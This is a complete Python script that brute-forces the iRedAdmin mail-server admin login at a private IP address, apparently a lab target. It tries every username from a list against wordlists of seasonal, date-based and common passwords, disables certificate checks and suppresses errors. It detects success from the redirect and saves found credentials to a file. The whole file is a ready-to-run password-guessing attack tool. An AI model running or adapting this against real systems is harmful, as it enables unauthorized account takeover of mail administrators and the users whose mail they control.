#!/usr/bin/env python3
"""
iRedAdmin Brute Force Script - FINAL VERSION
Checks redirect URL for success/failure
"""

import requests
import sys
import time
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# --- Configuration ---
url = "https://10.10.155.5/iredadmin/"
failure_indicator = "msg=INVALID_CREDENTIALS"
# --------------------

WORDLISTS = [
    ('days.txt', 'Day-based passwords'),
    ('seasons.txt', 'Season-based passwords'),
    ('months.txt', 'Month-based passwords'),
    ('common-passwords.txt', 'Common passwords'),
    ('10k-most-common.txt', 'Top 10k common passwords')
]

# Load users
with open("users.txt", "r") as f:
    users = [line.strip() for line in f if line.strip() and not line.startswith('#')]
print(f"[+] Loaded {len(users)} users")

found = False

for wordlist_file, description in WORDLISTS:
    if found:
        break
    
    try:
        with open(wordlist_file, "r") as f:
            passwords = [line.strip() for line in f if line.strip()]
        print(f"\n[+] Testing {description} ({len(passwords)} passwords)")
    except FileNotFoundError:
        continue
    
    total = len(users) * len(passwords)
    count = 0
    start_time = time.time()
    
    for user in users:
        if found:
            break
        for password in passwords:
            count += 1
            if count % 25 == 0:
                elapsed = time.time() - start_time
                rate = count / elapsed
                percent = (count / total) * 100
                sys.stdout.write(f"\r  Progress: {count}/{total} ({percent:.1f}%) | Rate: {rate:.1f}/s | Trying: {user}:{password[:15]}")
                sys.stdout.flush()
            
            data = {"username": user, "password": password}
            try:
                r = requests.post(url, data=data, verify=False, timeout=5, allow_redirects=False)
                
                # Check if it's a redirect and if the location contains the failure indicator
                if r.status_code == 303:
                    location = r.headers.get('Location', '')
                    if failure_indicator not in location:
                        print(f"\n\n{'='*60}")
                        print(f"✅ SUCCESS! Valid credentials found!")
                        print(f"{'='*60}")
                        print(f"Wordlist: {wordlist_file}")
                        print(f"Username: {user}")
                        print(f"Password: {password}")
                        print(f"Redirect: {location}")
                        print(f"{'='*60}\n")
                        
                        with open("iredadmin_real_credentials.txt", "w") as f:
                            f.write(f"{user}:{password}\n")
                        
                        found = True
                        break
            except:
                pass
    
    elapsed = time.time() - start_time
    print(f"\n  Completed {description} in {elapsed:.1f} seconds")

if found:
    print(f"\n✅ Credentials saved to iredadmin_real_credentials.txt")
else:
    print(f"\n❌ No valid credentials found in any wordlist")
